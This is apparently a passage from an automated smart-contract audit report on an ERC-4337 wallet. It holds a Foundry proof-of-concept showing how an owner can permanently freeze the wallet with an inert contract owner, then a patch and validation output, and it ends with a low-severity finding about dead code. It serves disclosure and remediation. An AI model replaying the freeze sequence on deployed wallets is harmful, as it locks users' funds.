        address recoveryOwner = makeAddr("recoveryOwner");
        vm.deal(address(wallet), 1 ether);

        vm.startPrank(ownerEOA);
        wallet.addOwnerAddress(address(deadOwner));
        wallet.removeOwnerAtIndex(0, abi.encode(ownerEOA));
        vm.stopPrank();

        assertEq(wallet.ownerCount(), 1);
        assertTrue(wallet.isOwnerAddress(address(deadOwner)));
        assertFalse(wallet.isOwnerAddress(ownerEOA));
        assertEq(address(wallet).balance, 1 ether);

        vm.prank(ownerEOA);
        vm.expectRevert(MultiOwnable.Unauthorized.selector);
        wallet.execute(recipient, 0.1 ether, "");
        assertEq(recipient.balance, 0);
        assertEq(address(wallet).balance, 1 ether);

        vm.prank(ownerEOA);
        vm.expectRevert(MultiOwnable.Unauthorized.selector);
        wallet.addOwnerAddress(recoveryOwner);

        UserOperation06 memory op = _baseUserOp(address(wallet), 0);
        op.callData = abi.encodeCall(HPSmartWallet.execute, (recipient, 0.1 ether, ""));
        bytes32 userOpHash = keccak256("frozen user op");
        op.signature = _eoaSignature(ownerPk, userOpHash, 0);

        vm.prank(entryPointAddr);
        uint256 validationData = wallet.validateUserOp(op, userOpHash, 0);
        assertEq(validationData, 1);

        bytes32 hash = keccak256("message");
        bytes memory deadOwnerSig = abi.encode(HPSmartWallet.SignatureWrapper({ ownerIndex: 1, signatureData: hex"deadbeef" }));
        assertEq(wallet.isValidSignature(hash, deadOwnerSig), bytes4(0xffffffff));
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd /repo/contracts && rm -rf out cache && forge build
```

### Output

```
[output truncated: 24 lines & 0.9990234375 KB skipped]
84 |     modifier notDelegated() virtual {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[PASS] test_reachableOwnerCanFreezeWalletByLeavingOnlyUnreachableContractOwner() (gas: 393238)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.49ms (816.76µs CPU time)

Ran 1 test suite in 10.16ms (2.49ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC succeeded via public owner entry points only. It demonstrates the freeze with a malicious current owner adding an inert contract owner, then removing the last reachable EOA owner; the test proves direct execution, owner recovery, ERC-4337 validation, and ERC-1271 authorization all fail afterward. It does not prove recovery impossibility against hypothetical future code at the inert owner address, only the permanent freeze for a non-authorizing contract under the current deployment.

## Remediation

### Explanation

Reject 32-byte address owners that already have contract code by tightening OwnerValidation at the shared owner-write/prediction chokepoint; this prevents adding non-authorizing contract owners and keeps factory prediction/deployment rules aligned.

### Patch

```diff
diff --git a/contracts/src/wallets/libraries/OwnerValidation.sol b/contracts/src/wallets/libraries/OwnerValidation.sol
--- a/contracts/src/wallets/libraries/OwnerValidation.sol
+++ b/contracts/src/wallets/libraries/OwnerValidation.sol
@@ -1,41 +1,46 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { FCL_Elliptic_ZZ } from "@FreshCryptoLib/FCL_elliptic.sol";
 
 /// @title OwnerValidation
 /// @notice Single source of truth for "is this owner payload a controllable owner?". Shared by the wallet
 ///         (`MultiOwnable`, on add/initialize) and the factory (`getAddress`/`createAccount`, on counterfactual
 ///         prediction) so that address prediction, deployment, and owner management never diverge.
 /// @dev A controllable owner is one that can actually authorize the wallet — i.e. produce a signature or be a
-///      `msg.sender`. Inert encodings (`address(0)`, off-curve / zero P-256 keys) are rejected so they can never
-///      become the sole owner and permanently brick the account.
+///      `msg.sender`. Inert encodings (`address(0)`, contract addresses for the 32-byte address-owner path, or
+///      off-curve / zero P-256 keys) are rejected so they can never become the sole owner and permanently brick
+///      the account.
 library OwnerValidation {
     /// @dev Error signatures intentionally mirror `MultiOwnable`'s so selectors are identical across both.
     error InvalidOwnerBytesLength(bytes owner);
     error InvalidEthereumAddressOwner(bytes owner);
     error InvalidPublicKeyOwner(bytes owner);
 
     /// @notice Reverts unless `owner` encodes a controllable owner.
     /// @dev 32 bytes: a non-zero EOA address within the uint160 range. 64 bytes: a secp256r1 public key whose
     ///      `(x, y)` lies on the curve (`ecAff_isOnCurve` also rejects `(0, 0)` and out-of-field coordinates).
-    function validate(bytes memory owner) internal pure {
+    function validate(bytes memory owner) internal view {
         if (owner.length == 32) {
             uint256 value = uint256(bytes32(owner));
             if (value == 0 || value > type(uint160).max) {
                 revert InvalidEthereumAddressOwner(owner);
             }
+
+            if (address(uint160(value)).code.length != 0) {
+                revert InvalidEthereumAddressOwner(owner);
+            }
             return;
         }
 
         if (owner.length == 64) {
             (uint256 x, uint256 y) = abi.decode(owner, (uint256, uint256));
             if (!FCL_Elliptic_ZZ.ecAff_isOnCurve(x, y)) {
                 revert InvalidPublicKeyOwner(owner);
             }
             return;
         }
 
         revert InvalidOwnerBytesLength(owner);
     }
 }

diff --git a/contracts/src/wallets/HPSmartWalletFactory.sol b/contracts/src/wallets/HPSmartWalletFactory.sol
--- a/contracts/src/wallets/HPSmartWalletFactory.sol
+++ b/contracts/src/wallets/HPSmartWalletFactory.sol
@@ -1,137 +1,137 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { LibClone } from "@solady/utils/LibClone.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { HPSmartWallet } from "./HPSmartWallet.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { IHPWalletFactory } from "./interfaces/IHPWalletFactory.sol";
 import { OwnerValidation } from "./libraries/OwnerValidation.sol";
 
 /// @title HPSmartWalletFactory
 /// @notice CREATE2 ERC-1967 proxy factory for `HPSmartWallet` (Coinbase-style account factory). It is also the
 ///         authoritative wallet-legitimacy oracle: every wallet it deploys is flagged in `isHPWallet`, keyed by
 ///         the unforgeable CREATE2 address. The paymaster reads that flag to decide what to sponsor.
 /// @dev There is deliberately no owner -> wallet registry. Owner-to-wallet discovery is handled off-chain by
 ///      Turnkey (which manages the signer and the deterministic wallet address), and enumeration/analytics are
 ///      handled by indexing the `AccountCreated` event. This removes the unauthenticated, globally-exclusive
 ///      owner indexing that previously allowed registry poisoning and counterfactual-address squatting.
 contract HPSmartWalletFactory is AddressBook, IHPWalletFactory {
     /// @notice Upper bound on owners per wallet. Generous for the EOA + passkey model while keeping the
     ///         counterfactual salt bound to an array that is always cheap enough to initialize on-chain (so a
     ///         predicted, pre-funded address can never be rendered undeployable by an oversized owner set).
     uint256 public constant MAX_OWNERS = 64;
 
     address public immutable implementation;
 
     /// @notice Wallet-keyed legitimacy flag. Keyed by the CREATE2 address, so it cannot be poisoned by
     ///         attacker-chosen owner bytes. Read by `HPPaymaster` during validation (sender-associated storage).
     mapping(address wallet => bool) public isHPWallet;
 
     /// @dev Deployment order. Enumeration only; prefer indexing `AccountCreated` off-chain for large sets.
     address[] private _wallets;
 
     event AccountCreated(address indexed account, bytes[] owners, uint256 nonce);
 
     error ImplementationUndeployed();
     error OwnerRequired();
     error TooManyOwners(uint256 count);
 
     constructor(address implementation_, address addressProvider_) payable AddressBook(addressProvider_) {
         if (implementation_.code.length == 0) revert ImplementationUndeployed();
         implementation = implementation_;
     }
 
     /// @notice Deploys (or returns) the deterministic wallet for `owners` + `nonce` and flags it as an HP wallet.
     /// @dev Idempotent: an already-deployed wallet is returned without re-initialization or re-flagging. The salt
     ///      covers only owners + nonce, so user settings cannot influence the counterfactual address.
     function createAccount(bytes[] calldata owners, uint256 nonce)
         external
         payable
         virtual
         returns (HPSmartWallet account)
     {
         _validateOwners(owners);
 
         (bool alreadyDeployed, address accountAddress) =
             LibClone.createDeterministicERC1967(msg.value, implementation, _getSalt(owners, nonce));
 
         account = HPSmartWallet(payable(accountAddress));
 
         if (!alreadyDeployed) {
             account.initialize(owners);
             isHPWallet[accountAddress] = true;
             _wallets.push(accountAddress);
             emit AccountCreated(accountAddress, owners, nonce);
         }
     }
 
     /// @notice Counterfactual wallet address for `owners` + `nonce` (used by the client and Turnkey config).
     /// @dev Validates `owners` with the same rules as deployment, so a predicted address is always deployable
     ///      (no advertising of addresses that `createAccount` would reject, which could trap pre-funded ETH).
     function getAddress(bytes[] calldata owners, uint256 nonce) external view returns (address) {
         _validateOwners(owners);
         return LibClone.predictDeterministicAddress(initCodeHash(), _getSalt(owners, nonce), address(this));
     }
 
     function initCodeHash() public view virtual returns (bytes32) {
         return LibClone.initCodeHashERC1967(implementation);
     }
 
     // --------------------------------------------
     //  Enumeration
     // --------------------------------------------
 
     function walletCount() external view returns (uint256) {
         return _wallets.length;
     }
 
     function walletAt(uint256 index) external view returns (address) {
         return _wallets[index];
     }
 
     /// @notice Paginated read. Wallet creation is permissionless, so there is intentionally no unbounded
     ///         full-array getter (it could be spammed into an unservable size); use this or, preferably, index
     ///         the `AccountCreated` event off-chain.
     function getWallets(uint256 offset, uint256 limit) external view returns (address[] memory) {
         return _getWalletsSlice(offset, limit);
     }
 
     function _getWalletsSlice(uint256 offset, uint256 limit) private view returns (address[] memory wallets) {
         uint256 n = _wallets.length;
         if (offset >= n || limit == 0) {
             return new address[](0);
         }
         uint256 end = offset + limit;
         if (end > n) end = n;
         uint256 len = end - offset;
         wallets = new address[](len);
         for (uint256 i; i < len; ++i) {
             wallets[i] = _wallets[offset + i];
         }
     }
 
     /// @dev Mirrors deployment-time owner validation: non-empty, each owner controllable, no duplicates. Keeps
     ///      counterfactual prediction and deployment in lockstep so funds are never sent to an undeployable
     ///      address. Note `OwnerValidation` cannot reject the (unknowable here) future wallet's own address as an
     ///      owner; that self-owner case is caught at deployment by `MultiOwnable._addOwnerAtIndex`.
-    function _validateOwners(bytes[] calldata owners) internal pure {
+    function _validateOwners(bytes[] calldata owners) internal view {
         if (owners.length == 0) revert OwnerRequired();
         if (owners.length > MAX_OWNERS) revert TooManyOwners(owners.length);
 
         for (uint256 i; i < owners.length; ++i) {
             OwnerValidation.validate(owners[i]);
 
             bytes32 ownerHash = keccak256(owners[i]);
             for (uint256 j; j < i; ++j) {
                 if (ownerHash == keccak256(owners[j])) revert MultiOwnable.AlreadyOwner(owners[i]);
             }
         }
     }
 
     function _getSalt(bytes[] calldata owners, uint256 nonce) internal pure returns (bytes32) {
         return keccak256(abi.encode(owners, nonce));
     }
 }
```

### Affected files
- `contracts/src/wallets/libraries/OwnerValidation.sol`
- `contracts/src/wallets/HPSmartWalletFactory.sol`

### Validation output

```
[output truncated: 33 lines & 1.58203125 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[FAIL: InvalidEthereumAddressOwner(0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9)] test_reachableOwnerCanFreezeWalletByLeavingOnlyUnreachableContractOwner() (gas: 321501)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# No-op self-assignment of EIP-712 descriptor returns
**#85743**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/base/WalletERC1271.sol`
#### Lines 10-30 — _Active EIP-5267 eip712Domain() getter (not overridden by HPSmartWallet); fields=0x0f keeps output consistent despite the dead assignments_ — _No-op self-assignments: `salt = salt;` and `extensions = extensions;`_

```
    function eip712Domain()
        external
        view
        virtual
        returns (
            bytes1 fields,
            string memory name,
            string memory version,
            uint256 chainId,
            address verifyingContract,
            bytes32 salt,
            uint256[] memory extensions
        )
    {
        fields = hex"0f";
        (name, version) = _domainNameAndVersion();
        chainId = block.chainid;
        verifyingContract = address(this);
        salt = salt;
        extensions = extensions;
    }
```

## Description

The EIP-5267 descriptor getter `eip712Domain()` populates most named return variables from real sources (`fields`, `name`, `version`, `chainId`, `verifyingContract`) but then assigns the `salt` and `extensions` return variables to themselves with `salt = salt;` and `extensions = extensions;`. These are no-op statements: the named returns are already zero-initialized, so the getter returns `salt == bytes32(0)` and an empty `extensions` array. Because `fields` is `0x0f` (bits for name/version/chainId/verifyingContract only, salt bit unset), the emitted values are in fact consistent with both EIP-5267 and the live `domainSeparator()` implementation, which omits salt and extensions. The construct is therefore dead, misleading code rather than an output-correctness bug. The risk is purely maintainability: a future edit intending to surface a real salt or extension list would be silently overwritten by the self-assignment, and the `fields` bitmap would also need to change in lockstep.

## Root cause

Return variables `salt` and `extensions` are assigned to themselves instead of being given meaningful values or left implicit, producing dead code that merely echoes their zero defaults.

## Impact

There is no attacker-exploitable consequence: off-chain signers that honor the `fields` bitmap reconstruct the same domain separator the contract uses, so signature verification is unaffected. The only effect is developer confusion and a latent regression risk if someone later attempts to populate `salt`/`extensions` without removing the self-assignments and updating the `fields` byte.
